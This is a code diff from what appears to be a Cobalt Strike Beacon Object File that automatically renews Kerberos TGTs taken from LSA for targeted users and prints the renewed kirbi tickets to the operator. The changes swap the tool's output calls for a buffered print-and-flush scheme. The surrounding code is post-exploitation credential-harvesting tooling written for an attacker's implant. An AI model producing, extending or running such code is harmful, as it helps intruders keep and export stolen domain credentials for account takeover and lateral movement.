@@ -451,12 +451,17 @@ VOID RenewTicket(HANDLE hLsa, ULONG authPackage, PTICKET_ENTRY ticket, char* dc)
     // Print renewed ticket
     PrintTicketInformation(ticket, "Renewed TGT");
     PrintTicket(kirbiBytes, kirbiSize);
+    bflush();
     BeaconWakeup();
 }
 
 VOID go(char* args, int argc) {
     datap parser = { 0 };
     HANDLE hStop = BeaconGetStopJobEvent();
+
+    g_out    = (char*)MemAlloc(OUTBUFSIZE);
+    g_outLen = 0;
+    if (g_out) g_out[0] = '\0';
 
     BeaconDataParse(&parser, args, argc);
     int interval = BeaconDataInt(&parser);
@@ -492,13 +497,14 @@ VOID go(char* args, int argc) {
         return; 
     }
     
-    BeaconPrintf(CALLBACK_OUTPUT, "[*] Starting automatic TGT renewal (interval: %ds) (threshold: %dmin)\n", interval, threshold);
-    BeaconPrintf(CALLBACK_OUTPUT, "[*] Domain Controller : %s\n", dc);
+    bprintf("[*] Starting automatic TGT renewal (interval: %ds) (threshold: %dmin)\n", interval, threshold);
+    bprintf("[*] Domain Controller : %s\n", dc);
     if (targetUsers && targetUsers[0] != '\0')
-        BeaconPrintf(CALLBACK_OUTPUT, "[*] Target users      : %s\n", targetUsers);
+        bprintf("[*] Target users      : %s\n", targetUsers);
     if (targetLuids && targetLuids[0] != '\0')
-        BeaconPrintf(CALLBACK_OUTPUT, "[*] Target LUIDs      : %s\n", targetLuids);
-    BeaconPrintf(CALLBACK_OUTPUT, "\n"); 
+        bprintf("[*] Target LUIDs      : %s\n", targetLuids);
+    bprintf("\n"); 
+    bflush();
     BeaconWakeup();
 
     do {
@@ -525,7 +531,7 @@ VOID go(char* args, int argc) {
                     // Manual calculation to avoid ___divdi3 import which crashes agent on x86
                     LONGLONG diff = ticket->endTime.QuadPart - now.QuadPart;
                     int remaining = 0; while (diff >= 600000000LL) { diff -= 600000000LL; remaining++; }
-                    BeaconPrintf(CALLBACK_OUTPUT, "[*] Remaining ticket lifetime below threshold (%d < %dmin).", remaining, threshold);
+                    bprintf("[*] Remaining ticket lifetime below threshold (%d < %dmin).", remaining, threshold);
                 
                     RenewTicket(hLsa, authPackage, ticket, dc);
                 }
@@ -544,5 +550,8 @@ VOID go(char* args, int argc) {
     SECUR32$LsaDeregisterLogonProcess(hLsa);
     ADVAPI32$RevertToSelf();
 
-    BeaconPrintf(CALLBACK_OUTPUT, "\n[+] BOF execution completed.\n");
+    bprintf("\n[+] BOF execution completed.\n");
+    bflush();
+    if (g_out && g_out != (char*)1) MemFree(g_out);
+    g_out = (char*)1; g_outLen = 1;
 }
